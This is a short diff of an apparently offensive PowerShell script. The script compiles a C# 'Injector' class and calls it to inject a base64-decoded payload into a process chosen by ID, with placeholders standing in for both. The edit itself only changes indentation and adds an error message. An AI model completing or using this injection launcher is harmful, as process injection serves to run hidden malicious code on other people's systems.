@@ -69,8 +69,8 @@ namespace Injector
 "@
 
 Try {
-  Add-Type -TypeDefinition $Injector -Language CSharp
+    Add-Type -TypeDefinition $Injector -Language CSharp
 } Catch {
-
+    Write-Output "CSharp already loaded"
 }
 [Injector.Injector]::Inject([PID], [Convert]::FromBase64String("[PAYLOAD]"));
